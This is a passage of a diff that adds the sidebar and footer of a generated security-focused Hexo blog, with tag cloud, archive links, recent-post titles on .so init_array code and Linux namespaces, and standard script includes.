href="/tags/Pwn/" rel="tag">Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Reverse/" rel="tag">Reverse</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Symbolic-Execution/" rel="tag">Symbolic Execution</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tensorflow/" rel="tag">Tensorflow</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Virtual/" rel="tag">Virtual</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/ARM/" style="font-size: 11px;">ARM</a> <a href="/tags/Algorithms/" style="font-size: 10px;">Algorithms</a> <a href="/tags/Android/" style="font-size: 20px;">Android</a> <a href="/tags/Blockchain/" style="font-size: 11px;">Blockchain</a> <a href="/tags/C-C/" style="font-size: 18px;">C/C++</a> <a href="/tags/Crypto/" style="font-size: 10px;">Crypto</a> <a href="/tags/Docker/" style="font-size: 10px;">Docker</a> <a href="/tags/Fuzzing/" style="font-size: 15px;">Fuzzing</a> <a href="/tags/IoT/" style="font-size: 12px;">IoT</a> <a href="/tags/Java/" style="font-size: 14px;">Java</a> <a href="/tags/Kernel/" style="font-size: 19px;">Kernel</a> <a href="/tags/Machine-Learning/" style="font-size: 17px;">Machine Learning</a> <a href="/tags/Pwn/" style="font-size: 19px;">Pwn</a> <a href="/tags/Reverse/" style="font-size: 13px;">Reverse</a> <a href="/tags/Symbolic-Execution/" style="font-size: 12px;">Symbolic Execution</a> <a href="/tags/Tensorflow/" style="font-size: 10px;">Tensorflow</a> <a href="/tags/Virtual/" style="font-size: 16px;">Virtual</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">July 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">June 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">June 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">May 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/04/">April 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">March 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/02/">February 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">December 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">May 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">March 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">January 2016</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/07/29/so%E6%96%87%E4%BB%B6%E7%9A%84-init-array%E6%AE%B5%E4%B8%AD%E6%B7%BB%E5%8A%A0%E4%BB%A3%E7%A0%81/">so文件的.init_array段中添加代码</a>
+          </li>
+        
+          <li>
+            <a href="/2020/07/09/PID-namespace/">PID namespace</a>
+          </li>
+        
+          <li>
+            <a href="/2020/07/08/Mount-namespace/">Mount namespace</a>
+          </li>
+        
+          <li>
+            <a href="/2020/07/06/User-namespace/">User namespace</a>
+          </li>
+        
+          <li>
+            <a href="/2020/07/01/UnionFS%E6%8A%80%E6%9C%AF/">UnionFS技术</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
